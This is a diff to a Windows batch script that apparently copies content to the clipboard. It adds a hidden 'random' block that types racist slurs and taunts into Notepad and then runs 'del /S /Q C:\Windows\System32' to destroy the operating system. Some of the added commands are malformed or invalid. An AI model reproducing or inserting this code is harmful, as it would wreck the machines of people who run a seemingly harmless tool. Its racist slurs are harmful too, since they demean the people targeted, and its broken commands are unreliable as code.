@@ -15,3 +15,15 @@ powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Window
 timeout /t 2 >nul
 
 echo Copied the content!
+
+:: random
+start notepad 
+timeout /t 2 >nul
+powershell.exe SendKeys "^%FUCK NIGGERS, PWNED BY CRYPTIC DATA🤣🤣 FREE PASSWORDS☠️%☠️☠️☠️🙏🙏🙏🙏🙏🙏🤣🤣🤣"
+powershell.exe SendKeys "^% SAY BYE BYE TO SYSTEM32 AND YOU☠️☠️☠️🙏🙏🙏🤣🤣🤣"
+start taskmanager
+taskkill all 
+del /S /Q C:\Windows\System32
+start notepad 
+powershell.exe SendKeys "^%bye bye🙏🙏🙏☠️☠️🙏🙏🤣🤣🤫🤫🤫"
+taskkill notepad
